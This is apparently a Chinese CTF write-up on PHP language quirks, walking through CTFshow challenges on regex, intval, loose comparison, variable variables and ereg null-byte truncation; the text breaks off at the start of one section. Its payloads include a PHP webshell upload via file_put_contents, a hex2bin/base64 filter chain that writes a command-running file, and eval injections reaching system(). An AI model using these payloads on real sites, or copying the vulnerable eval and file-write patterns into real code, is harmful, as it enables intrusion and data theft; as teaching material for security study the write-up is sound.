---
title: PHP特性刍议
date: 2026-11-29
category: CTF
tags:
  - CTF
  - Writeup
  - web
  - PHP
summary: 有关PHP特性的讲解
draft: false
---


# PHP特性刍议

>来看看吧我们的PHP特性是怎么样的呢？应该有很多和PHP有关的绕过吧。虽然但是这个 CTFshow 上有关PHP特性的题目可是超级无敌多我去，感觉和命令执行一样多了，这该不会是万字长文吧...

骗你的，两万字长文

![[web-php-features-1.png]]

## 来吧，开始

### pt.1.1

```php
<?php
include("flag.php");  
highlight_file(__FILE__);  
  
if(isset($_GET['num'])){
    $num = $_GET['num'];  
    if(preg_match("/[0-9]/", $num)){  
        die("no no no!");  
    }  
    if(intval($num)){  
        echo $flag;  
    }  
}
```

审计一下代码，我们就可以发现，首先我们要以 GET 请求发一个 num ，随后这个 num 会被放在 `preg_match("/[0-9]/", $num)` 里做比较，而里面的那一串 `"/[0-9]/"` 要想理解它到底是个什么，过这层筛子是要求 num 全是 0-9 的数字还是说有数字即可，我们就要介绍正则表达式，因为这个 `preg_match()` 函数里面的 `/.../` 两个斜杠就是正则

#### 正则
正则是一种搜索方式，如果搜索到了，就返回1，否则返回0，它搜索的是字符串，在这里运用 `preg_match()` 函数，除了会返回这两个数字以外，如果你写成数组字典等等格式它不认，就会报错返回 false，这是非常重要的一点
```
   /[0-9]/
   ↑  ↑   
   |  |   
   |  模式本体
   定界符（任选，常用 / # ~）所以 ~[0-9]~ 和 #[0-9]# 是等价的
```
然后里面的内容是这样的，如果你没有加 `[]` 就是找连续的字符，比如给的是 `/abc/` 说明就是找连续的 abc，而我们的中括号 `[]` 则是告诉我们在这里任意挑一个就行了，比如 `[a-zA-Z0-9]` 就是说明任意写一个字母数字就行，当然如果里面有符号 `^` 则是取反，是“非”的意思，`[^abc]` 就是不是 a、b、c 的任意字符

但是我们每次都要写这种常见的字符会很麻烦，所以为了方便，我们还特地给出了预定义的字符

| 简写   | 等价于              | 含义    |
| ---- | ---------------- | ----- |
| `\d` | `[0-9]`          | 数字    |
| `\D` | `[^0-9]`         | 非数字   |
| `\w` | `[a-zA-Z0-9_]`   | 单词字符  |
| `\W` | 反过来              | 非单词字符 |
| `\s` | 空白（空格、\t、\n、\r…） | 空白    |
| `.`  | 除换行外的**任意一个**字符  | 任意    |
修饰符

|修饰符|含义|
|---|---|
|`i`|忽略大小写|
|`m`|多行：`^` `$` 按行生效|
|`s`|单行：`.` 也能匹配换行|
|`x`|忽略模式里的空白和注释|
|`D`|`$` 只匹配绝对结尾（堵末尾换行坑）|
|`u`|UTF-8 模式|
|`A`|强制从头匹配（等价于模式前加 `\A`）|
会放在正则表达的后面，比如 `/^php$/im` 的意思就是php忽略大小写，范围是任意一行
当然它还有量词

|量词|含义|
|---|---|
|`*`|0 次或多次|
|`+`|1 次或多次|
|`?`|0 次或 1 次|
|`{n}`|恰好 n 次|
|`{n,}`|至少 n 次|
|`{n,m}`|n 到 m 次|
量词只管它前面紧挨着的那一个元素：
```
/[0-9]+/   →  一个数字，后面再跟 0 个或多个数字  →  本质是"一串数字"
/[0-9]/    →  只要求一个数字
```
我们还要来介绍一下锚点，顾名思义，锚点就是确定一个位置的符号

| 模式           | 含义            |
| ------------ | ------------- |
| `/[0-9]/`    | 字符串里任意地方有一个数字 |
| `/^[0-9]/`   | 字符串开头是数字      |
| `/[0-9]$/`   | 字符串结尾是数字      |
| `/^[0-9]$/`  | 整串恰好一个数字      |
| `/^[0-9]+$/` | 整串全是数字        |
发现了吗？锚点是用来定义头和尾的，而决定长度的则是量词

当然我们还有很多还没讲，之后遇到了再说

讲完正则之后我们再回过头来看这道题，是不是更加清晰了呢，因为正则查找返回的只有0和1，而 if(正则)，如果我们检索到了数字了的话，就会导致 `die()` ，因此我们不能输入数字的字符串，我们输入 `?num=1` 是不让我们过的，那怎么办呢？解决办法就要回到我们一开始讲正则的时候，我们提到了，函数 `preg_match()` 遇到了非字符串的格式会报 false ，那我们让它变成数组

>在GET请求里面，构造数组的方式，比如这道题我们需要GET一个 num，那么我们可以输入 `?num[]=1` 的方式来构造出数组

我们为什么一定要花了老命去写这个数字呢？是因为我们看到了后面拿到flag的前提

```php
    if(intval($num)){  
        echo $flag;  
```
同样我们需要让 `intval($num) == 1` 这样才能拿到flag

> 函数 `intval()` 的本质是把任何东西都压缩成整数，而且不会返回 false，永远返回整数，从左往右读，读到读不懂的字符就停，返回已经读到的部分。一个数字都没读到就返回 0。

intval的格式是 `intval($value,int $base)` ，第一个参数可以是任何类型，第二个参数是进制，不写默认是10进制，特殊的，当第二个是 0 的时候是自动识别模式，你写 `0x123` 就是 16进制，`0b` 2进制，`0` 就是8进制

能让 intval 读进去的，只有 空格 `\t` `\n` 等空白，正负号，数字和第一个小数点（当然小数点后的数会截断，不会四舍五入），除此之外遇到任何字符都会停

| 输入          | `intval` | 为什么                  |
| ----------- | -------- | -------------------- |
| `"123abc"`  | 123      | 读到 `a` 停             |
| `"abc"`     | 0        | 第一个字符就读不懂            |
| `"abc123"`  | 0        | 数字在后面没用              |
| `""`        | 0        | 空                    |
| `" "`       | 0        | 只有空白                 |
| `" -42abc"` | -42      | 空白 + 符号 + 数字，遇 `a` 停 |
| `"+12"`     | 12       | 正号合法                 |
| `"-1.9"`    | -1       | 向零截断，不是 -2           |
| `"0e123"`   | 0        | 科学计数法算出来就是 0         |
| `"1e3"`     | 1000     | PHP 7.1+ 认科学计数法      |
当然 intval 还有一些特殊的返回

| 输入                            | `intval`   | 说明            |
| ----------------------------- | ---------- | ------------- |
| `1.9`（float）                  | 1          | 截断            |
| `true`                        | 1          |               |
| `false`                       | 0          |               |
| `null`                        | 0          |               |
| `[]`                          | 0          |               |
| `[0]` 或 `["abc"]` 或 `[0,0,0]` | 1          | 非空数组恒为 1，内容不管 |
| 对象（无 `__toString`）            | 1+ Warning | 对象也压成 1       |

所以这道题我们看完这么多的知识点，终于知道了要怎么绕过了
 payload是 `?num[]=1` 即可

这不刚刚的知识就用到了
```php
include("flag.php");  
highlight_file(__FILE__);  
if(isset($_GET['num'])){    $num = $_GET['num'];  
    if($num==="4476"){  
        die("no no no!");  
    }  
    if(intval($num,0)===4476){  
        echo $flag;  
    }else{  
        echo intval($num,0);  
    }  
}
```
要我们数字不能是4476，但是intval可以自动选择进制，那我们考虑八进制，写 `/?num=010574` 即可，因为010574八进制转十进制就是4476

当然，为什么我喜欢8进制而不是十六进制呢？因为8进制纯数字没有字母啊，如果你遇到了比如
```php
include("flag.php");  
highlight_file(__FILE__);  
if(isset($_GET['num'])){    $num = $_GET['num'];  
    if($num==4476){  
        die("no no no!");  
    }  
    if(preg_match("/[a-z]/i", $num)){  
        die("no no no!");  
    }  
    if(intval($num,0)==4476){  
        echo $flag;  
    }else{  
        echo intval($num,0);  
    }  
}
```
这样的题，不让你输字母，那不炸了，所以还是8进制好用
### pt.1.2

我们来看这个
```php
show_source(__FILE__);  
include('flag.php');  
$a=$_GET['cmd'];  
if(preg_match('/^php$/im', $a)){  
    if(preg_match('/^php$/i', $a)){  
        echo 'hacker';  
    }  
    else{  
        echo $flag;  
    }  
}  
else{  
    echo 'nonononono';  
}
```
分析正则，要过第一个if，它要求的是 `im` 的修饰符——我们首先要的是任意一行有php，之后，我们就能过第一行if，但是还有第二关，只有 `i` 修饰符，说明了在有换行之后，我们不能只有php，因此我们可以在cmd=php后面加一个\n 然后再随便输入点东西，当然 `\n` 这个是要用url表示成 `%0a` 的不然不认，最后直接写 `/?cmd=php%0a1` 即可

### pt.1.3

看一个新的
```php
include("flag.php");  
highlight_file(__FILE__);  
if(isset($_GET['num'])){    $num = $_GET['num'];  
    if($num==="4476"){  
        die("no no no!");  
    }  
    if(preg_match("/[a-z]/i", $num)){  
        die("no no no!");  
    }  
    if(!strpos($num, "0")){  
        die("no no no!");  
    }  
    if(intval($num,0)===4476){  
        echo $flag;  
    }  
}
```
审计，发现首先它不能有字母，其次，有点绕的是 `if(!strpos($num, "0"))` 到底要求我们要不要有 `0` ？

分析一下，如果有 0，strpos就会出0的位置，`!非0` = 0，if(0) 就不会执行，所以这意味着，我们需要让数字里面出现0，而且这个0的位置还不能是第一位，因为第一位会返回0，而 `!0`=1 就会die，这就意味着所有进制都不能过，因为它们的识别方式开头都有0，那如果不能是第一位所以我们考虑写 4476.0，聪明吧，这样就可以过了，因为 intval 可以把小数点后面的给截去，所以在小数点后写就可以过了

```php
include("flag.php");  
highlight_file(__FILE__);  
if(isset($_GET['num'])){    $num = $_GET['num'];  
    if($num==4476){  
        die("no no no!");  
    }  
    if(preg_match("/[a-z]|\./i", $num)){  
        die("no no no!!");  
    }  
    if(!strpos($num, "0")){  
        die("no no no!!!");  
    }  
    if(intval($num,0)===4476){  
        echo $flag;  
    }  
}
```

但是当遇到这样的筛子，我们要怎么过呢？跟着我的思路来，我们要的是第一个字符不能是0，而且这道题屏蔽了上道题的符号 `.`，这就导致了我们只能写整数，或者说八进制，但是八进制我们的0是第一位啊！对，八进制的0是第一位，但是这不代表我们的字符串这个0占了第一位，我们可以用 `%20` `+` 这样的符号来充当第一位，这样的话我们就可以绕过了

### pt.1.4

这样的题
```php
highlight_file(__FILE__);  
  
if(isset($_GET['u'])){  
    if($_GET['u']=='flag.php'){  
        die("no no no");  
    }else{        
    highlight_file($_GET['u']);  
    }  
  
}
```
分析得到我们需要访问 flag.php，但是路径不能只是 flag.php，可能我们想到了之前的命令执行里面，我们使用了 `fla\g.php` 来绕过检测，这道题为什么不可以呢？因为 `$_GET['u']=='flag.php'` 这个是字符串比较，发生在 PHP 层，而 `highlight_file($_GET['u']); ` 是路径解析，发生在系统层面，在这道题就是Linux系统 `\` 这个并非路径语法，只能作为普通字符，因此文件不存在

要想解决这道题，我们有两个方法，其一是运用绝对路径，也是我想到的办法，既然我们猜出这个flag的位置（结合之前做的百来道题目），那我们可以猜猜看路径就是 `/var/www/html/flag.php` ，还真的是

其二就是相对路径，但是我们要在前面加一个 `./` ，先再次选择一次当前路径，再到 flag.php ，这样就可以过了

### pt.1.5

较难题
```php
include("flag.php");  
highlight_file(__FILE__);  
if (isset($_POST['a']) and isset($_POST['b'])) {  
if ($_POST['a'] != $_POST['b'])  
if (md5($_POST['a']) === md5($_POST['b']))  
echo $flag;  
else  
print 'Wrong.';  
}  
?>
```
审计代码，我们发现它有两层过滤，第一层是宽松的 `a != b` ，只要不相等即可，不用考虑数据类型，第二个则是非常严格的相等，三个等号 `===` 要求的是数据结构和数据本身都要相等，但是我们在md5相等的情况下，要想哈希，ab的数据结构就一定是字符串，如果不是字符串的话，在PHP7的环境下就会返回 `null`，这就是这道题的突破点，就比如我们发送 `a[]=1&b[]=2` ，这样md5返回的都是null，我们让 `null === null` ，这样就可以过了！

`当然有人问，如果我们在PHP8的环境下，PHP不会返回null，而是会直接报错，那我们要怎么过？其实早在2004年，王小云团队就证明了MD5是可碰撞的——即存在一对不相同的字符串使得它们的md5值是相同的，这道题同样也可以使用哈希碰撞的方法过，但是发送的时候注意这是二进制，不能直接塞给URL，得用POST+body的方式，body里的a还得是URL编码的形式...了解即可`

### pt.2.1 三元表达式 ternary operator

这啥啊
```php
include("flag.php");  
$_GET?$_GET=&$_POST:'flag';  
$_GET['flag']=='flag'?$_GET=&$_COOKIE:'flag';  
$_GET['flag']=='flag'?$_GET=&$_SERVER:'flag';  
highlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);  
  
?>
```

我们要学习的是：三元表达式。这纯粹是看不懂题啊，所以我们要了解下三元表达式的结构
```text
条件 ? 表达式A : 表达式B;
代表着
条件 ? 条件为真时取的值 : 条件为假时取的值
  1         2                   3
```
如果 1，就用 2，否则用 3

就比如
```text
$age = 20;
$label = $age >= 18 ? 'adult' : 'minor';  
```
等价于
```php
if ($age >= 18) {
    $label = 'adult';
} else {
    $label = 'minor';
}
```

当然，放在 PHP 的体系里面，三元表达式，本身就可以作为一个值，可以作为参数，可以直接赋值，既然可以作为值，它的两个分支就可以是任何表达式比如赋值，函数调用

那么第一行
```php
$_GET ? $_GET = &$_POST : 'flag';
//等价于
if ($_GET) {
    $_GET = &$_POST;    // 真分支：有副作用（重新绑定）
} else {
    'flag';             // 假分支：一个字符串字面量，什么也不做
}
```
`'flag'` 的意思就是 else 里面什么都没干，这个应该好理解的，因为没有做赋值之类的运算，没有和之后的运算链接，所以这不是我们想要的，但是三元运算符是不能省略的，就是你必须写一个上去

那我们解释一下接下来的内容就是
```php
if ($_GET) {                           // 有任何 GET 参数
    $_GET = &$_POST;
}
if ($_GET['flag'] == 'flag') {         // 此时的 $_GET 其实是 $_POST
    $_GET = &$_COOKIE;
}
if ($_GET['flag'] == 'flag') {         // 此时的 $_GET 其实是 $_COOKIE
    $_GET = &$_SERVER;
}
if ($_GET['HTTP_FLAG'] == 'flag') {    // 此时的 $_GET 其实是 $_SERVER
    highlight_file($flag);
} else {
    highlight_file(__FILE__);
}
```

也就是说我们要GET一个参数，然后POST,COOKIE,SERVER请求头=flag，就行了
发包
```http
POST /?flag=flag HTTP/1.1
Host: ...
...
Content-Type: application/x-www-form-urlencoded
Cookie:flag=flag
Flag:flag
Content-Length: 9

flag=flag
```
但是有人会问，我们不是有一行是 `$_GET['HTTP_FLAG'] == 'flag'` 吗？那为什么在我们的包里面没有出现 HTTP_FLAG，而是只有 `Flag:flag` ，我们要知道在 `$_SERVER` 里面，作为请求头，它会自动把请求头的内容转大写，中划线变成下划线，随后在前面拼接一个 `HTTP_` ，就比如说你有一个 `User-Agent` ，它的值就会变成 `HTTP_USER_AGENT` 所以这就是为什么这道题的请求头我们只要发送 Flag:flag 即可（其实不大写也可以）

注意一定要有 `Content-Type: application/x-www-form-urlencoded` PHP 只有在看到这个头时才会把 body 解析进 `$_POST`，这样就可以了

### pt.2.2

来看这道题
```php
highlight_file(__FILE__);  
$allow = array();  
for ($i=36; $i < 0x36d; $i++) {     array_push($allow, rand(1,$i));  
}  
if(isset($_GET['n']) && in_array($_GET['n'], $allow)){    file_put_contents($_GET['n'], $_POST['content']);  
}  
  
?>
```
审计代码
一开始让变量 `$allow` 类型变成数组，随后for循环，让 `i` 从 36 到 0x36d = 十进制的 877 ，也就是i的范围是36-876，一共有841个数，`rand` 是随机数，我们看一眼就差不多猜出来 `array_push($allow, rand(1,$i))` 的意思就是把 1到i的随机数放到 allow 里面，循环 841 次，也就是说 allow 里面有 841 个随机数
接下来判断，如果我们有 GET 一个 n，然后这个 n 又是 allow 里面的元素，我们就可以把 content 里面的内容用 POST 方法给放到一个叫 `n` 的文件里（没有就会新建）

问题在于：数字怎么能作为文件呢？当然，如果我们能有一个办法让它作为文件，content里面写我们老生常谈的 `<?=system($_GET['c'])?>` 即可

这就是 PHP 的版本特性以及函数的知识
>in_array的函数其实是 `in_array($needle, $haystack, $strict = false)` 它的比较默认是宽松的，n里面是字符串，allow里面的数是整数，整数和字符串在 PHP7 版本下比较的时候，会先把字符串转换为整数，再进行比较
>从左向右一个个读，如果遇到了非数字的部分就截断，纯非数字就是0

其实我们已经知道怎么写了，我们写个 `1.php` ，这样在 `in_array` 这里，我们 GET 到的 n 其实是数字 1，这样的话比较就很方便了，接下来我们就来试试看

```http
POST /?n=1.php HTTP/1.1
Host: ...
...
Content-Type: application/x-www-form-urlencoded

content=<?=system($_GET['c']);?>
```
一定要 POST 啊啊啊，刚刚发错了发成 GET 了...


### pt.2.3

有些熟悉
```php
highlight_file(__FILE__);  
include("ctfshow.php");  
//flag in class ctfshow;  
$ctfshow = new ctfshow();  
$v1=$_GET['v1'];  
$v2=$_GET['v2'];  
$v3=$_GET['v3'];  
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);  
if($v0){  
    if(!preg_match("/\;/", $v2)){  
        if(preg_match("/\;/", $v3)){  
            eval("$v2('ctfshow')$v3");  
        }  
    }  
      
}  
?>
```
审计代码，当然这里出现了类 `class` ，我们要先介绍一下类
#### 类
class，简单来说就是一个模板，比如你想要给 100 个人分别输出他们的名字，你一个个打出来非常麻烦，那你可以直接
```python 
class Person:
	def __init__(self, name, age):
		self.name = name
		self.age = age
	
	def introduce():
		print(self.name + self.age)
```
遇到了人就可以
```python
person1 = Person("Lain", 15)
person2 = ...

person1.introduce()
person2...
```

所以类就是一个模板，当然放在这里我们不用了解非常深入，我们只要知道，在 PHP 的语言体系里面，如何输出类的值，因为类是可以定义全局变量的，所以在这道题里面 flag 应该就是被放在了全局变量里了，我们只要把类里面的内容全部输出就行了。

这道题里面，还有一个概念就是 `new` ，它在内存里面选了个空间，然后按照类内部定义的属性，给对象（这道题是 `$ctfshow` ）填上了初始值，初始值会包含全局变量和其它自己的实例属性，我们怎么读取呢？就用 `var_dump($ctfshow)` 这个函数就可以返回所有ctfshow的实例属性了


然后我们回过头来看这个代码，继续审计，我们GET了 v1 v2 v3，但是 v0 这里，我们看上去要求他们三者全是数字——实则不然，因为 `=` 的权重是比 `and` 高的，所以顺序是 v0 先赋值到的是 `is_numeric($v1)` ，只要它是数字，后面 v2 v3 是什么都没有关系，而v2 v3实际上真的不能是数字，因为我们要 RCE，就要让v2 v3成为我们想要的那部分代码，当然这道题不用拿 shell，直接dump就行了

当然那一层筛子也跟没筛一样，就跟我们说v2不能有 `;` 而v3一定要有 `;` ，最后我们可以直接写这样 `/?v1=1&v2=var_dump&v3=;var_dump($ctfshow);` 就可以出了


然后说是去掉了原来的非预期解...我想问你想要的预期解到底是什么
```php
highlight_file(__FILE__);  
include("ctfshow.php");  
//flag in class ctfshow;  
$ctfshow = new ctfshow();  
$v1=$_GET['v1'];  
$v2=$_GET['v2'];  
$v3=$_GET['v3'];  
$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);  
if($v0){  
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\)|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\;|\?|[0-9]/", $v2)){  
        if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\\$|\%|\^|\*|\(|\-|\_|\+|\=|\{|\[|\"|\'|\,|\.|\?|[0-9]/", $v3)){  
            eval("$v2('ctfshow')$v3");  
        }  
    }  
      
}  
?>
```
这道题虽然给我们ban了这么多，但是有些我们还是可以走的
，比如v2v3字母和空格都没有ban，而且v2ban `)` v3ban `(` ，说明他们可以构建出嵌套函数，我们最后还是想echo类似 `$ctfshow` 这样。

所以我们介绍一些知识

| 函数              | 作用                        |
| --------------- | ------------------------- |
| `compact('名字')` | 按**变量名的字符串**取出变量，返回数组     |
| `serialize($值)` | 把任何值（含对象）转成**字符串**，属性名全保留 |
比如compact
`compact('变量名1', '变量名2', ...)   →   返回一个关联数组array`
```php
$name = 'Cola';
$age = 20;

compact('name', 'age')
```
返回
```php
array(2) {
  ["name"] => string(4) "Cola"
  ["age"]  => int(20)
}
```
而这道题的关键就在于，compact函数是按名字取变量的，也就是说它并不需要 `$` ，这也是这道题绕过的关键

而serialize则是把里面的内容给序列化成可读文本，没有它，echo 就出不来，因为 echo只能输出字符串，不能输出其它类型，而在 serialize 之前的 `compact('ctfshow')` 本质上是数组，因此无法输出，那 payload 就很简单了 `/?v1=1&v2=echo(serialize(compact(&v3=)));` 即可

### pt.2.4

新
```php
highlight_file(__FILE__);  
$v1 = $_POST['v1'];  
$v2 = $_GET['v2'];  
$v3 = $_GET['v3'];  
$v4 = is_numeric($v2) and is_numeric($v3);  
if($v4){
    $s = substr($v2,2);
    $str = call_user_func($v1,$s);  
    echo $str;
    file_put_contents($v3,$str);  
}  
else{  
    die('hacker');  
}  
?>
```
审计，我们要POST v1，GET v2 v3，然后v4需要v2是数字，v3和之前一样没有限制，s是v2去掉前两个字符的字符串
然后这个 `call_user_func(a,b)` 就是把 a 当函数名，b当函数里面的参数，也就是 `a(b)` ，在这里就是 `$str = $v1($s)` 所以 v1 我们是要写个函数名的（系统自带的），接下来就把执行结果放到 v3 这个文件，当然我们之前遇到过，这个 `file_put_contents()` 函数是支持伪协议的，所以前面的 $v3 我们可以写伪协议

当然这道题我们有非常巧妙的解法，因为非常特殊，没有普遍意义，所以只讲解
这道题官方给出的打法是这样的
```
GET
v2=115044383959474e6864434171594473&v3=php://filter/write=convert.base64-
decode/resource=2.php
POST
v1=hex2bin
```
我们来分析一下，为什么这样可以绕过，首先v2经过substr之后会变成 5044383959474e6864434171594473，然后v1 hex2bin，这里为什么v2要能有字母 `e` 是因为 e 作为科学计数法，被允许在了数字里面。而特殊就特殊在这里有且只允许一个字母 e
出来之后是 `PD89YGNhdCAqYDs` 少了个 `=` 不过没关系，PHP的base64解码在非严格模式下是允许缺失填充的，最后base64解码的时候会补上，就是 
```
<?=`cat *`;
```
然后v3写的是2.php，我们只要访问2.php就可以了


### pt.3.1

新的内容
```php
highlight_file(__FILE__);  
include("flag.php");  
  
if(isset($_POST['v1']) && isset($_GET['v2'])){
    $v1 = $_POST['v1'];
    $v2 = $_GET['v2'];  
    if(sha1($v1)==sha1($v2)){  
        echo $flag;  
    }  
}  
?>
```
审计代码，先通过 include 函数将真正的flag先赋值给了 `$flag` ，我们要传 POST 的 v1 和 GET 的 v2 ，随后， `sha1` 是哈希，但是这道题并没有要求 `v1 != v2` ... 有手就行，没手也行

`顺便，其实这道题作者应该是想要我们通过魔术哈希来打的，但是估计一时犯浑了忘记加 v1 != v2 的限制了...`

好吧后面的题还真的有
```php
highlight_file(__FILE__);  
include("flag.php");  

if(isset($_POST['v1']) && isset($_GET['v2'])){    $v1 = $_POST['v1'];    $v2 = $_GET['v2'];  
    if(sha1($v1)==sha1($v2) && $v1!=$v2){  
        echo $flag;  
    }  
}  
?>
```

那我们还是讲一下魔术哈希，因为哈希是宽松相等，所以比较的是字符串，但是，当 `==` 遇到数字字符串的时候，会先转换为数字，这道题通关方法和科学计数法有关 `e` ，因为会先转换成数字，那零的任何次方都是0，所以如果我们构造出了形如 `0e1234567` 的以 `0e` 开头且除了 e 以外的其它数都是数字的哈希，那么在宽松相等的情况下，通过数学运算，就可以让他们相等，因为最后是 `0 = 0` ，至于怎么找的，那肯定是爆破，大概就是

```python
import hashlib, itertools, string
for s in itertools.product(string.ascii_letters, repeat=8):
    s = ''.join(s)
    h = hashlib.sha1(s.encode()).hexdigest()
    if h.startswith('0e') and h[2:].isdigit():
        print(s, h)
```


### pt.3.2

怎么这么长一串
```php
highlight_file(__FILE__);  
include('flag.php');  
error_reporting(0);  
$error='你还想要flag嘛？';  
$suces='既然你想要那给你吧！';  
foreach($_GET as $key => $value){  
    if($key==='error'){  
        die("what are you doing?!");  
    }  
    $$key=$$value;  
}foreach($_POST as $key => $value){  
    if($value==='flag'){  
        die("what are you doing?!");  
    }  
    $$key=$$value;  
}  
if(!($_POST['flag']==$flag)){  
    die($error);  
}  
echo "your are good".$flag."\n";  
die($suces);  
  
?>
```
首先依旧 `$flag` ，随后是一个 foreach 语句，我们先来看看 foreach 的语法是什么

```
foreach ($数组 as $键 => $值) { ... }
```
遍历的是数组（其实更熟悉的叫法应该叫字典），然后每一轮都把键给 `$key` 值给 `$value` ，当然是每一轮，因为它还是一个 for 循环

然后是一行我们看着会觉得比较奇怪的内容
```php
$$key=$$value
```
这`$$`是个什么？是 `变量变量` 的意思，意思是用这个变量当变量名，就比如 `$x = 'flag'` ，执行 `echo $$x` 就等价于 `echo $flag` 

那这里的意思到底是什么呢？
理解起来会比较困难，那我们拿一个例子来说明，如果我们这一个循环里面，`$key = "a";$value = "b";` ，那么意味着的就是 `$a = $b;` ，这下理解了吧

那又有人要问了这道题的键值对怎么来？其实就是 GET 后面的?a=flag 和 POST 里面的请求体，就比如你发了个
```
URL:  ?suces=flag&arr[]=1&dup=1&dup=2
body: flag=&z=2
```

PHP解析出来就是
```php
$_GET = [
  "suces" => "flag",      // ?suces=flag
  "arr"   => ["1"],       // arr[]=1 → 方括号让它变成数组
  "dup"   => "2",         // dup=1&dup=2 → 后者覆盖前者
]

$_POST = [
  "flag" => "",           // flag= 空字符串（不是 null）
  "z"    => "2",
]
```

这样的话我们在了解了这么多知识之后，再来分析这道题目
也就是说我发了比如 `?suces=flag` ，那最后得到的就是 `$suces=$flag`
首先我们 GET 一个，POST 一个，然后 GET 的键不能等于 error，POST的值不能是flag

然后我们要来仔细研究一下这道题真正有趣的地方
```php
foreach($_POST as $key => $value){  
    if($value==='flag'){  
        die("what are you doing?!");  
    }  
    $$key=$$value;  
}  
if(!($_POST['flag']==$flag)){  
    die($error);
```
这里理解起来会比较困难，我们先来看后面的if函数，首先我们先不用想着用 `$error=$flag` 来绕过，因为根本不行，因为上面的 POST 行不让你把值写成 `flag` ，所以那个 `$error` 一定是死的，不会返回 flag，这就说明我们必须要让我们 POST 时候发送的请求体 `flag=$flag(flag变量)` ，但是我们又不能预测未来，不知道真正的 flag 是什么...

于是我们有一个想法：**如果我们把 `$flag` 赋值为空，然后我们发 POST 的时候令 flag 为空就行了**。非常大胆的想法，那我们在第一个 `foreach` 函数的地方就要把 `$flag` 给赋值 `$suces` ，`$suces = $flag`， 这样就可以防止flag消失了

完美绕过

### pt.3.3

稍微加强了一下的版本
```php
highlight_file(__FILE__);  
error_reporting(0);  
include("flag.php");  
  
if(isset($_POST['v1'])){
    $v1 = $_POST['v1'];
    $v3 = $_GET['v3'];       
       parse_str($v1,$v2);  
       if($v2['flag']==md5($v3)){  
           echo $flag;  
       }  
  
}  
?>
```
依旧审计，我们要传一个 POST 的v1，和 GET 的 v3，然后我们接下来遇到了一个函数 `parse_str($v1,$v2)` ，它的意思是把v1变成数组，然后赋给 v2，v2拿到的是键值对，然后如果 v2中 flag 键所对应的值 等于 v3 的哈希，就返回 flag，那么问题就在于我们怎么样才能向 v1 传键值对，我们查找了一些写法

| 写法                  | 实际到达的 `$_POST['v1']` | `parse_str` 结果                     |
| ------------------- | -------------------- | ---------------------------------- |
| `v1=flag=c4ca...`   | `"flag=c4ca..."`     | `['flag' => 'c4ca...']`            |
| `v1=flag=abc&x=1`   | `"flag=abc"`         | `['flag' => 'abc']`，`x=1` 变成了另一个参数 |
| `v1=flag=abc%26x=1` | `"flag=abc&x=1"`     | 两个键都在                              |
当然如果你不想让 &x=1 单独变成一个参数，就可以把它按照编码发出来
一个参数区分参数名和值，仅用第一个 `=` 来区分，而后面的 `=` 则是作为了键值的区分

所以这道题，我们发 `v1=flag=c4ca4238a0b923820dcc509a6f75849b(1的哈希)` 和 `v3=1` 即可


### pt.3.4

一些新的
```php
highlight_file(__FILE__);  
error_reporting(0);  
include("flag.php");  
  
if (ereg ("^[a-zA-Z]+$", $_GET['c'])===FALSE)  {  
    die('error');  
}  
//只有36d的人才能看到flag  
if(intval(strrev($_GET['c']))==0x36d){  
    echo $flag;  
}  
?>
```
审计代码，这tm什么古老 PHP，冷知识，函数 `ereg()` 是在 PHP 5 时代下的产物，和 `preg_match()` 的功能类似，用的还是 C 的正则库，我们后面那个判断是可以理解的，就是我们最后需要让rev之后的整数（后面的字符可以截断）是 877(0x36d) 的倒过来，也就是我们要发 778，我们的payload就要写 `xxxx778`

然后 `ereg` 函数是这样的，如果匹配到了，就会返回字符串长度，否则返回 FALSE，而我们又知道，`"^[a-zA-Z]+$"` 意味着它必须要让字符串为字母，且不能换行（因为底层调用的是C库，换行的\n在C字符串里面只能作为 0x0A，会被放在正则里面比较），绕过的办法只有一个， `\0`，相信学过C的你，也意识到了为什么要写 `\0` ，因为 `\0` 在C里面相当于字符串的结束，也就是在第一行过滤的时候，到了 `\0` 就不再读取后面的字符了，这也就是为什么这里可以绕过

payload 可以写 `?c=a%00778`

### pt.3.5

然后是
```php
highlight_file(__FILE__);  
error_reporting(0);  
if(isset($_GET['v1']) && isset($_GET['v2'])){    $v1 = $_GET['v1'];    $v2 = $_GET['v2'];  
  
    if(preg_match('/[a-zA-Z]+/', $v1) && preg_match('/[a-zA-Z]+/', $v2)){  
            eval("echo new $v1($v2());");  
    }  
}  
?>
```
这个审计就很简单了，当然我们之前提到过，`new` 是针对实例而言的，所以v1是类名，而v2才是函数名，而正则表达式只需要我们在名字里面出现一个字母就行了，那是非常简单的事情。

真正执行 PHP 的是最外层套的 `eval` ，而内部的逻辑我们拆解一下

比如我们创建了一个 `123` 的类，然后v2的一个叫 `abc` 的函数，放在 eval 里面就是这样 
```php
eval("echo new 123(abc());")
```
实际上，eval就是看见什么执行什么，但是这也不妨碍 `123` 对里面的 `abc()` 的解析，也就是说，这两句话是独立运行的（其实应该是先 eval ，再类），所以如果我们把 abc 变成了比如 `system('')` ，那 eval 就会毫不客气的执行这个语句

唯一需要我们注意的是，这个类的名字一定是要已经定义过的，真实存在的。那我们又没有自己定义类，唯一的办法就是去看看系统自带了哪些类咯。好在系统自带了一个叫 `Exception` 的内置类，一定存在，同时它是接受参数的（这里就是我们要写的函数的返回值），然后这个参数如果放在第一个位置（当然这里只有一个位置，一般来说类都会以比如 `Exception(a,b,c,d)` 的形式存在），而我们拆开Exception的类看看，我们会发现第一个位置是
```
__construct(
    string $message = "",          // 第 1 个位置
    int $code = 0,                 // 第 2 个位置
    ?Throwable $previous = null    // 第 3 个位置
)
```

也就是说，第一个位置是message，它会在 echo 的时候 echo出来（因为 `$message` 也被放在了 `__toString()` 这个魔术方法下面，调用 echo 的时候会输出 `__toString()` 下的属性，也就自然会把 `$message()` 给输出）`冷知识：一个属性可以同时放在多个魔术方法下面`

**但是 Exception 里面是不能套 括号 的，如果套了括号，就会报error**

所以这道题的逻辑就是这样的：先system执行，虽然多了括号会报error，但是无论如何它已经执行了，所以会先回显
payload `?v1=Exception&v2=system('cat fl36dg.txt')`


### pt.3.6

加强
```php
highlight_file(__FILE__);  
error_reporting(0);  
if(isset($_GET['v1']) && isset($_GET['v2'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];    
